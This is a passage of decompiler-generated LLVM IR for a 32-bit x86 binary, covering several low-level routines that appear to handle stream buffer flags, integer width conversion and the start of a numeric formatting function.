  br i1 %v6_804f66b, label %dec_label_pc_804f6d5, label %dec_label_pc_804f66d

dec_label_pc_804f66d:                             ; preds = %dec_label_pc_804f667
  %v0_804f66d = load i32, i32* @ecx, align 4
  %v3_804f671 = inttoptr i32 %v3_804f641 to i16*
  %v4_804f671 = call i32 @function_804ce38(i16* %v3_804f671, i32 %arg2, i32 %v0_804f66d)
  store i32 %v4_804f671, i32* %eax.global-to-local, align 4
  %v0_804f676 = load i32, i32* @ebx, align 4
  %v1_804f676 = add i32 %v0_804f676, 16
  %v2_804f676 = inttoptr i32 %v1_804f676 to i32*
  %v3_804f676 = load i32, i32* %v2_804f676, align 4
  %v4_804f676 = load i32, i32* @edi, align 4
  %v5_804f676 = add i32 %v4_804f676, %v3_804f676
  store i32 %v5_804f676, i32* %v2_804f676, align 4
  %v0_804f67c = load i32, i32* @ebx, align 4
  %v1_804f67c = add i32 %v0_804f67c, 1
  %v2_804f67c = inttoptr i32 %v1_804f67c to i8*
  %v3_804f67c = load i8, i8* %v2_804f67c, align 1
  %v4_804f67c = urem i8 %v3_804f67c, 2
  %v5_804f67c = icmp eq i8 %v4_804f67c, 0
  br i1 %v5_804f67c, label %dec_label_pc_804f706, label %dec_label_pc_804f686

dec_label_pc_804f686:                             ; preds = %dec_label_pc_804f66d
  %v0_804f686 = load i32, i32* @edx, align 4
  %v0_804f687 = load i32, i32* @edi, align 4
  %v4_804f68b = call i32 @function_805002c(i8 10, i32 %v0_804f687, i32 %v0_804f686)
  store i32 %v4_804f68b, i32* %eax.global-to-local, align 4
  %v1_804f693 = icmp eq i32 %v4_804f68b, 0
  br i1 %v1_804f693, label %dec_label_pc_804f706, label %dec_label_pc_804f697

dec_label_pc_804f697:                             ; preds = %dec_label_pc_804f686
  %v0_804f69a = load i32, i32* @ebx, align 4
  %v1_804f69b = call i32 @function_804bcc0(i32 %v0_804f69a)
  store i32 %v1_804f69b, i32* %eax.global-to-local, align 4
  %v1_804f6a3 = icmp eq i32 %v1_804f69b, 0
  br i1 %v1_804f6a3, label %dec_label_pc_804f706, label %dec_label_pc_804f6a7

dec_label_pc_804f6a7:                             ; preds = %dec_label_pc_804f697
  %v0_804f6a7 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804f6a7, %v1_804f69b
  br i1 %tmp23, label %dec_label_pc_804f6ad, label %dec_label_pc_804f6af

dec_label_pc_804f6ad:                             ; preds = %dec_label_pc_804f6a7
  br label %dec_label_pc_804f6af

dec_label_pc_804f6af:                             ; preds = %dec_label_pc_804f6a7, %dec_label_pc_804f6ad
  %storemerge24 = phi i32 [ %v1_804f69b, %dec_label_pc_804f6ad ], [ %v0_804f6a7, %dec_label_pc_804f6a7 ]
  %v0_804f6b6 = phi i32 [ %v1_804f69b, %dec_label_pc_804f6ad ], [ %v0_804f6a7, %dec_label_pc_804f6a7 ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_804f6b1 = sub i32 %v0_804f6a7, %v0_804f6b6
  store i32 %v2_804f6b1, i32* %eax.global-to-local, align 4
  %v0_804f6b3 = load i32, i32* @ebp, align 4
  %v2_804f6b3 = add i32 %v0_804f6b3, %v2_804f6b1
  store i32 %v2_804f6b3, i32* %ebp.global-to-local, align 4
  %v4_804f6ba = call i32 @function_804ffbc(i8* inttoptr (i32 10 to i8*), i32 %v0_804f6b6, i32 %v2_804f6b1)
  store i32 %v4_804f6ba, i32* %eax.global-to-local, align 4
  store i32 %v4_804f6ba, i32* @edx, align 4
  %v1_804f6c4 = icmp eq i32 %v4_804f6ba, 0
  br i1 %v1_804f6c4, label %dec_label_pc_804f706, label %dec_label_pc_804f6c8

dec_label_pc_804f6c8:                             ; preds = %dec_label_pc_804f6af
  %v0_804f6c8 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f6c8 = load i32, i32* %esi.global-to-local, align 4
  %v2_804f6c8 = sub i32 %v0_804f6c8, %v4_804f6ba
  %v2_804f6cc = add i32 %v2_804f6c8, %v1_804f6c8
  store i32 %v2_804f6cc, i32* %eax.global-to-local, align 4
  %v0_804f6ce = load i32, i32* @ebx, align 4
  %v1_804f6ce = add i32 %v0_804f6ce, 16
  %v2_804f6ce = inttoptr i32 %v1_804f6ce to i32*
  %v3_804f6ce = load i32, i32* %v2_804f6ce, align 4
  %v5_804f6ce = sub i32 %v3_804f6ce, %v2_804f6cc
  store i32 %v5_804f6ce, i32* %v2_804f6ce, align 4
  %v0_804f6d1 = load i32, i32* @edi, align 4
  %v1_804f6d1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f6d1 = sub i32 %v0_804f6d1, %v1_804f6d1
  store i32 %v2_804f6d1, i32* @edi, align 4
  br label %dec_label_pc_804f706

dec_label_pc_804f6d5:                             ; preds = %dec_label_pc_804f667
  %v2_804f6d5 = add i32 %arg3, 8
  %v3_804f6d5 = inttoptr i32 %v2_804f6d5 to i32*
  %v4_804f6d5 = load i32, i32* %v3_804f6d5, align 4
  %v15_804f6d5 = icmp eq i32 %v3_804f641, %v4_804f6d5
  br i1 %v15_804f6d5, label %dec_label_pc_804f6ee, label %dec_label_pc_804f6da

dec_label_pc_804f6da:                             ; preds = %dec_label_pc_804f6d5
  %v1_804f6de = call i32 @function_804bcc0(i32 %arg3)
  store i32 %v1_804f6de, i32* %eax.global-to-local, align 4
  %v1_804f6e6 = icmp eq i32 %v1_804f6de, 0
  br i1 %v1_804f6e6, label %dec_label_pc_804f6da.dec_label_pc_804f6ee_crit_edge, label %dec_label_pc_804f6ea

dec_label_pc_804f6da.dec_label_pc_804f6ee_crit_edge: ; preds = %dec_label_pc_804f6da
  %v0_804f6ee.pre = load i32, i32* @edi, align 4
  %v0_804f6f6.pre = load i32, i32* @ebx, align 4
  %v2_804f6fd.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804f6ee

dec_label_pc_804f6ea:                             ; preds = %dec_label_pc_804f6da
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804f706

dec_label_pc_804f6ee:                             ; preds = %dec_label_pc_804f6da.dec_label_pc_804f6ee_crit_edge, %dec_label_pc_804f6d5, %dec_label_pc_804f620
  %v2_804f6fd = phi i32 [ %v2_804f6fd.pre, %dec_label_pc_804f6da.dec_label_pc_804f6ee_crit_edge ], [ %v0_804f623, %dec_label_pc_804f6d5 ], [ %v0_804f623, %dec_label_pc_804f620 ]
  %v0_804f6f6 = phi i32 [ %v0_804f6f6.pre, %dec_label_pc_804f6da.dec_label_pc_804f6ee_crit_edge ], [ %arg3, %dec_label_pc_804f6d5 ], [ %arg3, %dec_label_pc_804f620 ]
  %v0_804f6ee = phi i32 [ %v0_804f6ee.pre, %dec_label_pc_804f6da.dec_label_pc_804f6ee_crit_edge ], [ %arg2, %dec_label_pc_804f6d5 ], [ %arg2, %dec_label_pc_804f620 ]
  store i32 %v2_804f6fd, i32* @ebx, align 4
  store i32 %v0_804f621, i32* @edi, align 4
  %v4_804f701 = inttoptr i32 %v0_804f6f6 to i16*
  %v5_804f701 = call i32 @function_804f5a0(i16* %v4_804f701, i32 %v0_804f6ee, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f701, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f706

dec_label_pc_804f706:                             ; preds = %dec_label_pc_804f6af, %dec_label_pc_804f697, %dec_label_pc_804f686, %dec_label_pc_804f66d, %dec_label_pc_804f6ea, %dec_label_pc_804f6c8, %dec_label_pc_804f653, %dec_label_pc_804f6ee
  %v0_804f709 = load i32, i32* @edi, align 4
  store i32 %v0_804f709, i32* %eax.global-to-local, align 4
  %v2_804f70b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f70b, i32* @ebx, align 4
  store i32 %v0_804f622, i32* @esi, align 4
  store i32 %v0_804f621, i32* @edi, align 4
  store i32 %v0_804f620, i32* @ebp, align 4
  ret i32 %v0_804f709

; uselistorder directives
  uselistorder i32 %v2_804f6cc, { 1, 0 }
  uselistorder i32 %v4_804f6ba, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804f6b1, { 1, 0, 2 }
  uselistorder i32 %v0_804f6a7, { 3, 0, 1, 2 }
  uselistorder i32 %v2_804f667, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_804f621, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_804f706, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_804f6af, { 1, 0 }
  uselistorder label %dec_label_pc_804f653, { 1, 0 }
}

define i32 @function_804f710(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f710:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f710 = load i32, i32* @ebx, align 4
  %v4_804f714 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f714, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_804f71c = bitcast i16* %arg1 to i32*
  %v2_804f71c = load i32, i32* %v1_804f71c, align 4
  store i32 %v2_804f71c, i32* %eax.global-to-local, align 4
  %v1_804f71e = urem i32 %v2_804f71c, 65536
  store i32 %v1_804f71e, i32* %edx.global-to-local, align 4
  %v2_804f721 = and i32 %v1_804f71e, %arg2
  %v3_804f721 = icmp eq i32 %v2_804f721, 0
  %v1_804f723 = icmp eq i1 %v3_804f721, false
  br i1 %v1_804f723, label %dec_label_pc_804f732, label %dec_label_pc_804f725

dec_label_pc_804f725:                             ; preds = %dec_label_pc_804f710
  %v1_804f725 = and i32 %v2_804f71c, 2176
  %v2_804f725 = icmp eq i32 %v1_804f725, 0
  store i32 %v1_804f725, i32* %edx.global-to-local, align 4
  %v1_804f72b = icmp eq i1 %v2_804f725, false
  br i1 %v1_804f72b, label %dec_label_pc_804f73a, label %dec_label_pc_804f72d

dec_label_pc_804f72d:                             ; preds = %dec_label_pc_804f725
  %v2_804f72d = or i32 %v2_804f71c, %arg2
  store i32 %v2_804f72d, i32* %eax.global-to-local, align 4
  %v1_804f72f = trunc i32 %v2_804f72d to i16
  store i16 %v1_804f72f, i16* %arg1, align 2
  %v0_804f732.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f732

dec_label_pc_804f732:                             ; preds = %dec_label_pc_804f710, %dec_label_pc_804f72d
  %v0_804f777 = phi i32 [ %v4_804f714, %dec_label_pc_804f710 ], [ %v0_804f732.pre, %dec_label_pc_804f72d ]
  %v1_804f732 = inttoptr i32 %v0_804f777 to i16*
  %v2_804f732 = load i16, i16* %v1_804f732, align 2
  %v3_804f732 = zext i16 %v2_804f732 to i32
  store i32 %v3_804f732, i32* %edx.global-to-local, align 4
  %v2_804f735 = and i16 %v2_804f732, 32
  %v3_804f735 = icmp eq i16 %v2_804f735, 0
  br i1 %v3_804f735, label %dec_label_pc_804f74e, label %dec_label_pc_804f73a

dec_label_pc_804f73a:                             ; preds = %dec_label_pc_804f732, %dec_label_pc_804f725
  %v1_804f73a = call i32 @function_804b4bc(i32 %v0_804f710)
  store i32 %v1_804f73a, i32* %eax.global-to-local, align 4
  %v1_804f73f = inttoptr i32 %v1_804f73a to i32*
  store i32 9, i32* %v1_804f73f, align 4
  br label %dec_label_pc_804f745

dec_label_pc_804f745:                             ; preds = %dec_label_pc_804f765, %dec_label_pc_804f73a
  %v0_804f745 = load i32, i32* @ebx, align 4
  %v1_804f745 = inttoptr i32 %v0_804f745 to i16*
  %v2_804f745 = load i16, i16* %v1_804f745, align 2
  %v3_804f745 = or i16 %v2_804f745, 8
  store i16 %v3_804f745, i16* %v1_804f745, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f7a8

dec_label_pc_804f74e:                             ; preds = %dec_label_pc_804f732
  %v2_804f74e = urem i16 %v2_804f732, 4
  %v3_804f74e = icmp eq i16 %v2_804f74e, 0
  br i1 %v3_804f74e, label %dec_label_pc_804f794, label %dec_label_pc_804f753

dec_label_pc_804f753:                             ; preds = %dec_label_pc_804f74e
  %v2_804f753 = and i32 %v3_804f732, 4
  %v3_804f753 = icmp eq i32 %v2_804f753, 0
  %v1_804f756 = icmp eq i1 %v3_804f753, false
  br i1 %v1_804f756, label %dec_label_pc_804f784, label %dec_label_pc_804f758

dec_label_pc_804f758:                             ; preds = %dec_label_pc_804f753
  %v1_804f758 = add i32 %v0_804f777, 20
  %v2_804f758 = inttoptr i32 %v1_804f758 to i32*
  %v3_804f758 = load i32, i32* %v2_804f758, align 4
  store i32 %v3_804f758, i32* %eax.global-to-local, align 4
  %v2_804f75b = add i32 %v0_804f777, 16
  %v3_804f75b = inttoptr i32 %v2_804f75b to i32*
  %v4_804f75b = load i32, i32* %v3_804f75b, align 4
  %v15_804f75b = icmp eq i32 %v3_804f758, %v4_804f75b
  %v1_804f75e = icmp eq i1 %v15_804f75b, false
  br i1 %v1_804f75e, label %dec_label_pc_804f765, label %dec_label_pc_804f760

dec_label_pc_804f760:                             ; preds = %dec_label_pc_804f758
  %v2_804f760 = and i32 %v3_804f732, 2
  %v3_804f760 = icmp eq i32 %v2_804f760, 0
  br i1 %v3_804f760, label %dec_label_pc_804f784, label %dec_label_pc_804f765

dec_label_pc_804f765:                             ; preds = %dec_label_pc_804f760, %dec_label_pc_804f758
  %v1_804f765 = and i32 %v3_804f732, 1024
  store i32 %v1_804f765, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_804f765, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_804f778 = call i32 @function_8050d04(i32 %v0_804f777, i32 0, i32 %tmp18, i32 %v1_804f765)
  store i32 %v5_804f778, i32* %eax.global-to-local, align 4
  %v1_804f780 = icmp eq i32 %v5_804f778, 0
  %v1_804f782 = icmp eq i1 %v1_804f780, false
  br i1 %v1_804f782, label %dec_label_pc_804f745, label %dec_label_pc_804f765.dec_label_pc_804f784_crit_edge

dec_label_pc_804f765.dec_label_pc_804f784_crit_edge: ; preds = %dec_label_pc_804f765
  %v0_804f784.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f784

dec_label_pc_804f784:                             ; preds = %dec_label_pc_804f765.dec_label_pc_804f784_crit_edge, %dec_label_pc_804f760, %dec_label_pc_804f753
  %v10_804f784 = phi i32 [ %v0_804f784.pre, %dec_label_pc_804f765.dec_label_pc_804f784_crit_edge ], [ %v0_804f777, %dec_label_pc_804f760 ], [ %v0_804f777, %dec_label_pc_804f753 ]
  %v1_804f784 = inttoptr i32 %v10_804f784 to i16*
  %v2_804f784 = load i16, i16* %v1_804f784, align 2
  %v3_804f784 = and i16 %v2_804f784, -4
  store i16 %v3_804f784, i16* %v1_804f784, align 2
  %v0_804f788 = load i32, i32* @ebx, align 4
  %v1_804f788 = add i32 %v0_804f788, 8
  %v2_804f788 = inttoptr i32 %v1_804f788 to i32*
  %v3_804f788 = load i32, i32* %v2_804f788, align 4
  store i32 %v3_804f788, i32* %eax.global-to-local, align 4
  %v2_804f78b = add i32 %v0_804f788, 24
  %v3_804f78b = inttoptr i32 %v2_804f78b to i32*
  store i32 %v3_804f788, i32* %v3_804f78b, align 4
  %v0_804f78e = load i32, i32* %eax.global-to-local, align 4
  %v1_804f78e = load i32, i32* @ebx, align 4
  %v2_804f78e = add i32 %v1_804f78e, 16
  %v3_804f78e = inttoptr i32 %v2_804f78e to i32*
  store i32 %v0_804f78e, i32* %v3_804f78e, align 4
  %v0_804f791 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f791 = load i32, i32* @ebx, align 4
  %v2_804f791 = add i32 %v1_804f791, 20
  %v3_804f791 = inttoptr i32 %v2_804f791 to i32*
  store i32 %v0_804f791, i32* %v3_804f791, align 4
  %v0_804f794.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f794

dec_label_pc_804f794:                             ; preds = %dec_label_pc_804f74e, %dec_label_pc_804f784
  %v9_804f794 = phi i32 [ %v0_804f777, %dec_label_pc_804f74e ], [ %v0_804f794.pre, %dec_label_pc_804f784 ]
  %v1_804f794 = inttoptr i32 %v9_804f794 to i16*
  %v2_804f794 = load i16, i16* %v1_804f794, align 2
  %v3_804f794 = or i16 %v2_804f794, 64
  store i16 %v3_804f794, i16* %v1_804f794, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804f79a = load i32, i32* @ebx, align 4
  %v1_804f79a = inttoptr i32 %v0_804f79a to i16*
  %v2_804f79a = load i16, i16* %v1_804f79a, align 2
  %v3_804f79a = zext i16 %v2_804f79a to i32
  store i32 %v3_804f79a, i32* %eax.global-to-local, align 4
  %v3_804f79d = and i16 %v2_804f79a, 2816
  %v4_804f79d = icmp eq i16 %v3_804f79d, 0
  %v1_804f7a0 = icmp eq i1 %v4_804f79d, false
  br i1 %v1_804f7a0, label %dec_label_pc_804f7a8, label %dec_label_pc_804f7a2

dec_label_pc_804f7a2:                             ; preds = %dec_label_pc_804f794
  %v1_804f7a2 = add i32 %v0_804f79a, 12
  %v2_804f7a2 = inttoptr i32 %v1_804f7a2 to i32*
  %v3_804f7a2 = load i32, i32* %v2_804f7a2, align 4
  store i32 %v3_804f7a2, i32* %eax.global-to-local, align 4
  %v2_804f7a5 = add i32 %v0_804f79a, 28
  %v3_804f7a5 = inttoptr i32 %v2_804f7a5 to i32*
  store i32 %v3_804f7a2, i32* %v3_804f7a5, align 4
  %v0_804f7a8.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f7a8

dec_label_pc_804f7a8:                             ; preds = %dec_label_pc_804f794, %dec_label_pc_804f745, %dec_label_pc_804f7a2
  %v0_804f7a8 = phi i32 [ 0, %dec_label_pc_804f794 ], [ -1, %dec_label_pc_804f745 ], [ %v0_804f7a8.pre, %dec_label_pc_804f7a2 ]
  store i32 %v0_804f7a8, i32* %eax.global-to-local, align 4
  %v2_804f7aa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f7aa, i32* @edx, align 4
  store i32 %v0_804f710, i32* @ebx, align 4
  ret i32 %v0_804f7a8

; uselistorder directives
  uselistorder i32 %v0_804f7a8, { 1, 0 }
  uselistorder i32 %v0_804f79a, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_804f765, { 1, 0, 2 }
  uselistorder i32 %v0_804f777, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804f71e, { 1, 0 }
  uselistorder i32 %v2_804f71c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804f710, { 1, 0 }
  uselistorder i32 1024, { 0, 11, 3, 9, 7, 12, 4, 1, 2, 5, 10, 6, 8 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f7a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f794, { 1, 0 }
  uselistorder label %dec_label_pc_804f732, { 1, 0 }
}

define i32 @function_804f7b0() local_unnamed_addr {
dec_label_pc_804f7b0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v5_804f7b8 = icmp slt i32 %tmp, 0
  %v3_804f7e1 = and i32 %tmp4, 2048
  %v4_804f7e1 = icmp eq i32 %v3_804f7e1, 0
  br i1 %v5_804f7b8, label %dec_label_pc_804f7e1, label %dec_label_pc_804f7bf

dec_label_pc_804f7bf:                             ; preds = %dec_label_pc_804f7b0
  %v1_804f7c2 = icmp eq i1 %v4_804f7e1, false
  br i1 %v1_804f7c2, label %dec_label_pc_804f7e6, label %dec_label_pc_804f7c4

dec_label_pc_804f7c4:                             ; preds = %dec_label_pc_804f7bf
  %v1_804f7c4 = inttoptr i32 %tmp3 to i32*
  %v2_804f7c4 = load i32, i32* %v1_804f7c4, align 4
  %v6_804f7c6 = icmp eq i32 %tmp4, 256
  %v1_804f7cc = icmp eq i1 %v6_804f7c6, false
  br i1 %v1_804f7cc, label %dec_label_pc_804f7d3, label %dec_label_pc_804f7ce

dec_label_pc_804f7ce:                             ; preds = %dec_label_pc_804f7c4
  %v1_804f7ce = urem i32 %v2_804f7c4, 256
  br label %dec_label_pc_804f7de

dec_label_pc_804f7d3:                             ; preds = %dec_label_pc_804f7c4
  %v6_804f7d3 = icmp eq i32 %tmp4, 512
  %v1_804f7d9 = icmp eq i1 %v6_804f7d3, false
  br i1 %v1_804f7d9, label %dec_label_pc_804f7de, label %dec_label_pc_804f7db

dec_label_pc_804f7db:                             ; preds = %dec_label_pc_804f7d3
  %v1_804f7db = urem i32 %v2_804f7c4, 65536
  br label %dec_label_pc_804f7de

dec_label_pc_804f7de:                             ; preds = %dec_label_pc_804f7d3, %dec_label_pc_804f7ce, %dec_label_pc_804f7db
  %v0_804f7e0 = phi i32 [ %v2_804f7c4, %dec_label_pc_804f7d3 ], [ %v1_804f7ce, %dec_label_pc_804f7ce ], [ %v1_804f7db, %dec_label_pc_804f7db ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_804f7e0

dec_label_pc_804f7e1:                             ; preds = %dec_label_pc_804f7b0
  br i1 %v4_804f7e1, label %dec_label_pc_804f7ec, label %dec_label_pc_804f7e6

dec_label_pc_804f7e6:                             ; preds = %dec_label_pc_804f7e1, %dec_label_pc_804f7bf
  %v1_804f7e6 = add i32 %tmp3, 4
  %v2_804f7e6 = inttoptr i32 %v1_804f7e6 to i32*
  %v3_804f7e6 = load i32, i32* %v2_804f7e6, align 4
  store i32 %v3_804f7e6, i32* @edx, align 4
  %v1_804f7e9 = inttoptr i32 %tmp3 to i32*
  %v2_804f7e9 = load i32, i32* %v1_804f7e9, align 4
  ret i32 %v2_804f7e9

dec_label_pc_804f7ec:                             ; preds = %dec_label_pc_804f7e1
  %v1_804f7ec = inttoptr i32 %tmp3 to i32*
  %v2_804f7ec = load i32, i32* %v1_804f7ec, align 4
  %v6_804f7ee = icmp eq i32 %tmp4, 256
  %v1_804f7f4 = icmp eq i1 %v6_804f7ee, false
  br i1 %v1_804f7f4, label %dec_label_pc_804f7fb, label %dec_label_pc_804f7f6

dec_label_pc_804f7f6:                             ; preds = %dec_label_pc_804f7ec
  %v1_804f7f6 = mul i32 %v2_804f7ec, 16777216
  %v2_804f7f6 = sdiv i32 %v1_804f7f6, 16777216
  br label %dec_label_pc_804f804

dec_label_pc_804f7fb:                             ; preds = %dec_label_pc_804f7ec
  %v6_804f7fb = icmp eq i32 %tmp4, 512
  %v1_804f801 = icmp eq i1 %v6_804f7fb, false
  br i1 %v1_804f801, label %dec_label_pc_804f804, label %dec_label_pc_804f803

dec_label_pc_804f803:                             ; preds = %dec_label_pc_804f7fb
  %v1_804f803 = mul i32 %v2_804f7ec, 65536
  %v2_804f803 = sdiv i32 %v1_804f803, 65536
  br label %dec_label_pc_804f804

dec_label_pc_804f804:                             ; preds = %dec_label_pc_804f7fb, %dec_label_pc_804f7f6, %dec_label_pc_804f803
  %v0_804f804 = phi i32 [ %v2_804f7ec, %dec_label_pc_804f7fb ], [ %v2_804f7f6, %dec_label_pc_804f7f6 ], [ %v2_804f803, %dec_label_pc_804f803 ]
  %v1_804f804 = ashr i32 %v0_804f804, 31
  store i32 %v1_804f804, i32* @edx, align 4
  ret i32 %v0_804f804

; uselistorder directives
  uselistorder i32 %v0_804f804, { 1, 0 }
  uselistorder i32 %v2_804f7ec, { 2, 0, 1 }
  uselistorder i32 %v2_804f7c4, { 2, 0, 1 }
  uselistorder i32 %tmp3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804f804, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f7de, { 2, 0, 1 }
}

define i32 @function_804f808() local_unnamed_addr {
dec_label_pc_804f808:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_4()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f808 = load i32, i32* @ebx, align 4
  store i32 %v0_804f808, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_804f80d = ptrtoint i16* %tmp5 to i32
  store i32 %v4_804f80d, i32* %ebx.global-to-local, align 4
  %v4_804f811 = trunc i32 %tmp4 to i16
  %v6_804f819 = icmp eq i32 %tmp6, 256
  %v1_804f81f = icmp eq i1 %v6_804f819, false
  br i1 %v1_804f81f, label %dec_label_pc_804f825, label %dec_label_pc_804f821

dec_label_pc_804f821:                             ; preds = %dec_label_pc_804f808
  %v2_804f821 = trunc i32 %tmp4 to i8
  %v4_804f821 = bitcast i16* %tmp5 to i8*
  store i8 %v2_804f821, i8* %v4_804f821, align 1
  br label %dec_label_pc_804f843

dec_label_pc_804f825:                             ; preds = %dec_label_pc_804f808
  %v6_804f825 = icmp eq i32 %tmp6, 2048
  %v1_804f82b = icmp eq i1 %v6_804f825, false
  br i1 %v1_804f82b, label %dec_label_pc_804f834, label %dec_label_pc_804f82d

dec_label_pc_804f82d:                             ; preds = %dec_label_pc_804f825
  %sext2 = mul i32 %tmp4, 65536
  %v1_804f82d = sdiv i32 %sext2, 65536
  %v3_804f82d = bitcast i16* %tmp5 to i32*
  store i32 %v1_804f82d, i32* %v3_804f82d, align 4
  %v0_804f82f = load i32, i32* %edx.global-to-local, align 4
  %v1_804f82f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f82f = add i32 %v1_804f82f, 4
  %v3_804f82f = inttoptr i32 %v2_804f82f to i32*
  store i32 %v0_804f82f, i32* %v3_804f82f, align 4
  br label %dec_label_pc_804f843

dec_label_pc_804f834:                             ; preds = %dec_label_pc_804f825
  %v6_804f834 = icmp eq i32 %tmp6, 512
  %v1_804f83a = icmp eq i1 %v6_804f834, false
  br i1 %v1_804f83a, label %dec_label_pc_804f841, label %dec_label_pc_804f83c

dec_label_pc_804f83c:                             ; preds = %dec_label_pc_804f834
  store i16 %v4_804f811, i16* %tmp5, align 2
  br label %dec_label_pc_804f843

dec_label_pc_804f841:                             ; preds = %dec_label_pc_804f834
  %sext3 = mul i32 %tmp4, 65536
  %v1_804f841 = sdiv i32 %sext3, 65536
  %v3_804f841 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804f841, i32* %v3_804f841, align 4
  br label %dec_label_pc_804f843

dec_label_pc_804f843:                             ; preds = %dec_label_pc_804f83c, %dec_label_pc_804f82d, %dec_label_pc_804f821, %dec_label_pc_804f841
  %v2_804f843 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f843, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_804f844 = sdiv i32 %sext, 65536
  ret i32 %v1_804f844

; uselistorder directives
  uselistorder label %dec_label_pc_804f843, { 3, 0, 1, 2 }
}

define i32 @function_804f848(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804f848:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_804f853 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f853, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_804f85f = icmp slt i32 %arg4, 0
  %v1_804f861 = icmp eq i1 %v2_804f85f, false
  br i1 %v1_804f861, label %dec_label_pc_804f882, label %dec_label_pc_804f863

dec_label_pc_804f863:                             ; preds = %dec_label_pc_804f848
  %v1_804f863 = sub i32 0, %arg4
  store i32 %v1_804f863, i32* %esi.global-to-local, align 4
  %v2_804f865 = icmp slt i32 %arg3, 0
  %v1_804f867 = icmp eq i1 %v2_804f865, false
  br i1 %v1_804f867, label %dec_label_pc_804f882, label %dec_label_pc_804f869

dec_label_pc_804f869:                             ; preds = %dec_label_pc_804f863
  %v1_804f869 = sub i32 0, %arg2
  %v5_804f869 = icmp ne i32 %arg2, 0
  store i32 %v1_804f869, i32* %ecx.global-to-local, align 4
  %v2_804f86b = zext i1 %v5_804f869 to i32
  %v3_804f86b = add i32 %v2_804f86b, %arg3
  %v1_804f876 = sub i32 0, %v3_804f86b
  store i32 %v1_804f876, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f882

dec_label_pc_804f882:                             ; preds = %dec_label_pc_804f848, %dec_label_pc_804f863, %dec_label_pc_804f869
  %v0_804f887 = phi i32 [ %v1_804f863, %dec_label_pc_804f869 ], [ %v1_804f863, %dec_label_pc_804f863 ], [ %arg4, %dec_label_pc_804f848 ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_804f869 ], [ 0, %dec_label_pc_804f863 ], [ 0, %dec_label_pc_804f848 ]
  %div = udiv i32 -1, %v0_804f887
  %tmp36 = urem i32 -1, %v0_804f887
  %v1_804f889 = add i32 %tmp36, 1
  store i8 0, i8* %arg1, align 1
  %v1_804f88d = load i32, i32* %esi.global-to-local, align 4
  %v12_804f88d = icmp eq i32 %v1_804f889, %v1_804f88d
